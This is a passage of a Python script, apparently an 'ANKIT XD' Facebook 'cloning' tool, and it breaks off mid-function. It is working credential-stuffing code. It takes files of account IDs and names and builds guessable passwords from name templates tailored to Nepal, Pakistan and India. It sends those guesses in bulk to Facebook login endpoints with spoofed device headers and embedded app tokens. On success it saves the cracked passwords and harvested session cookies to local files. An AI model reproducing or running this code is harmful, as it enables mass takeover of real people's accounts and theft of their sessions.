    colors = ['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m']
    return random.choice(colors)

# Generate random strings for placeholders
statuses = ['Active', 'Inactive', 'Busy']
random_status = random.choice(statuses)
status_color = random_color()

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description='Run the script with your name.')
parser.add_argument('name', type=str, nargs='?', help='Your name')  # Make the name argument optional
args = parser.parse_args()

# Retrieve the user name from command-line argument or prompt if not provided
if args.name:
    personal_name = args.name.strip()
else:
    personal_name = input("Please enter your name: ").strip()

# Update the run count
run_count = update_run_count(personal_name)

# Handle status-based behavior
if random_status == 'Active' or personal_name.lower() == 'ankit':
    print("Running the command...")
elif random_status == 'Busy':
    print("\033[1;31mError: System is busy. Please try again later.\033[1;37m")
    exit()
elif random_status == 'Inactive':
    print("\033[1;33mSystem is inactive. Please run the script again later.\033[1;37m")
    exit()

# Display the logo
logo = f"""
\033[1;37m
   _____    _______   ____  __.______________
  /  _  \   \      \ |    |/ _|   \__    ___/
 /  /_\  \  /   |   \|      < |   | |    |   
/    |    \/    |    \    |  \|   | |    |   
\____|__  /\____|__  /____|__ \___| |____|   \x1b[38;5;196mXD\x1b[37m
                                                                              
\033[1;37m=============================================
\033[1;37m [+]Owner   : \033[32mANKIT\033[1;37m
\033[1;37m [+]Facebook: {status_color}Ankit {status_color}Uchida
\033[1;37m [+]STATUS  : {status_color}{random_status}\033[1;37m
\033[1;37m [+]Github  : \033[33mANKIT HERO\033[1;37m       
\033[1;37m [+]Version : 1.1
\033[1;37m [+]Run Count: {run_count}
\033[1;37m============================================="""
def linex():
	print('\033[1;37m=============================================')
def clear():
	os.system('clear')
	print(logo)
	#print(f"\033[1;36m PUT YOUR NAME LIKE Hamid, Hassan, Muskan, Ayesha ")
#Nam na s eX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NAME : ')	
A = '\x1b[1;97m'    
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
coki=[]
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m[√] %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m[•] %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#------------[ ANKIT MENU ]--------------#            
def menu():
			clear()
			#linex()	
			print('\033[1;37m           ========================')	 		   
			print(' \033[1;31m          [\033[1;37m1\033[1;31m] \033[1;37mFile cloning\n \033[1;31m          [\033[1;37m2\033[1;31m] \033[1;37mRandom cloning\n \033[1;31m          [\033[1;37m3\033[1;31m] \033[1;37mjoin whatsap group \n \033[1;31m          [\033[1;37m0\033[1;31m] \033[1;37mExit menu')			
			print('\033[1;37m           ========================')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' All method working ')
				linex()			
				print(' \033[1;33m[1] \033[1;37mMethod 1\n\033[1;33m [2] \033[1;37mMethod 2\n\033[1;33m [3] \033[1;37mMethod 3\n\033[1;33m [4]\033[1;37m Method 4\n\033[1;33m [5] \033[1;37mMethod 5\n \033[1;33m[6] \033[1;37mMethod 6\n\033[1;33m [7] \033[1;37mMethod 7\n\033[1;33m [8] \033[1;37mMethod 8')
				#print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) ')
				#print (' [4]  PERSONAL ')
				#print (' [5] UPDATED ')
				linex()
				mthd=input(' Choose: ')
				linex()
				clear()
				plist = []					
				print('\033[1;37m ')
				print('[1] Nepal password ')	
				print('[2] Pakistan password ')
				print('[3] India password ')		
				print ('[4] Philippines password ')
				linex()	
				pcx = input(' Choose: ')
				linex()
				if pcx in ['1','01']:
					plist = ['first','first11','first12','first123','first1234','first12345','first@11','first@12','first@123','first@1234','first@12345','firstlast123','@first123','first123@','last@123','maya@123','maya123','nepal123','nepal@123','nepal@123','nepal@12345','first last']										
				elif pcx in ['2','02']:
				     plist = ['first007', 'first777', 'first786', 'first786786', 'first1122', 'first12345', 'firstlast', 'first last', 'firstlast123', 'firstlast12345', 'firstlast007', 'firstlast1122', 'firstlast786', 'khan1122', 'pak12345', 'khan007', 'khankhan', 'Khan112233']
				elif pcx in ['3','03']:
				     plist = ['first123','first1234','first12345','first143','last143','firstlast123','lastfirst123','last123','Firstlast123','first06','first08','First123','First12345','last']				          	
				elif pcx in ['4','04']:	
				     plist = ['first123','first1234','first12345','first143','last143','firstlast123','lastfirst123','last123','Firstlast123','first06','first08','First123','First12345','last']				       			
				clear()
										   			        					   
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()							      					    
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['5','05']:
							crack_submit.submit(api5,ids,names,passlist)
						elif mthd in ['6','06']:
							crack_submit.submit(api6,ids,names,passlist)
						elif mthd in ['7','07']:
							crack_submit.submit(api7,ids,names,passlist)
						elif mthd in ['8','08']:
							crack_submit.submit(api8,ids,names,passlist)
				print('\033[1;37m')
				linex()				
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))   									
				input(' Press enter to back ')
				os.system('python trt.py')
				
			elif xd in ['2','02']:
			    rndm()
                
			elif xd in ['3','03']:
				gmail()
				#create()
				#dz._login()
				exit()
			elif xd in ['4','04']:
				os.system('xdg-open https://chat.whatsapp.com/BtSbBAkabek4fBAMcCUK6U')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
				
def rndm():
    print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Nepal India cloning\n [0] Back menu')
    linex()
    ap = input(' Choose: ')
    linex()
    if ap in ['1','01']:
            pak()
    elif ap in ['2','02']:
            bd()
    elif ap in ['3','03']:
            npxind()                              
    else:
            menu()
   
   
#------------[ METHOD 1 ]--------------#
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ANKIT-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|216a8ca8adfa721bd1e84171d5abad204b082890','6628568379|c1e620fa708a1d5696fb991c1bde5662']
			accees_token = random.choice(tokenlist)
			random_seed = random.Random()
			fbcr = sim_id
			ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/179.38.63.35;FBBV/22023207;FBDM/{density=2.4,width=947,height=1806};FBLC/en_US;FBRV/36921410;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/8.9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			head = {'User-Agent':ONE(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization': str(random.choice(tokenlist)),'X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','X-FB-Connection-Quality':'EXCELLENT','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True'}
			data = {'adid':str(''.join(random_seed.choices(string.hexdigits, k=16))).upper(),'format':'json','device_id':str(uuid.uuid4()).upper(),'email':ids,'password':pas,'generate_analytics_claims':'1','cpl':'true','try_num':'1','device_id':str(uuid.uuid4()).upper(),'credentials_type':'device_based_login_password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate",'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			po = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					coki = f"sb={ssbb};{ckkk}"
					print('\r\r\033[1;32m [ANKIT-OK] '+uid+' ✓ '+pas)
					print(' \33[1;33m[Biscut 🍪] ✓ '+coki)
					open('/sdcard/ANKITT/ANKIT-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/ANKITT/ANKIT-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					print('\r\033[1;91m [ANKIT-CP] '+uid+' × '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'ANKIT-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

#------------[ METHOD 2 ]--------------#		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ANKIT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(10000000, 99999999))
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.orca;FBDV/CPH2607;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"                        
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ONE(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        cek_apk(coki)
                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else: 
